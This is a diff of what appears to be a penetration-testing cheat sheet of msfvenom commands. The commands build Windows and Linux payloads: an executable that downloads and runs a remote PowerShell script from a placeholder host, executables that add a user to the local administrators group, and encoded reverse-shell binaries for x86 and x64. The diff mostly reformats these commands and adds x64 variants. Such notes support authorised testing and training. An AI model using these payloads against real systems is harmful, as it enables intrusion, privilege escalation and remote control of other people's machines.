@@ -57,41 +57,38 @@ Execute Command
 ```bash
 msfvenom -a x86 --platform Windows \
 -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" \
--f exe > pay.exe
+-f exe > payload.exe
 ```
 {% endcode %}
 
+{% code overflow="wrap" %}
 ```bash
+# x86
 msfvenom -a x86 --platform Windows -p \
 windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
+# x64
+msfvenom -a x64 --platform Windows -p windows/x64/exec CMD="net localgroup administrators shaun /add" -f exe > add-admin.exe
 ```
+{% endcode %}
 
 Reverse Shell
 
-* x86
-
+{% code overflow="wrap" %}
 ```bash
+# x86
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f exe -o Remote.exe
-```
-
-* x64
-
-```bash
+# x64
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f exe -o shell.exe
 ```
+{% endcode %}
 
 ### Linux
 
-* x86
-
 ```bash
+# x86
 msfvenom  -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=1337 \
 -e x86/shikata_ga_nai -f elf > asuka-x86.elf
-```
-
-* x64
-
-```bash
+# x64
 msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp \
 LHOST=<IP> LPORT=1337 -e x64/xor_dynamic -f elf > asuka.elf
 ```
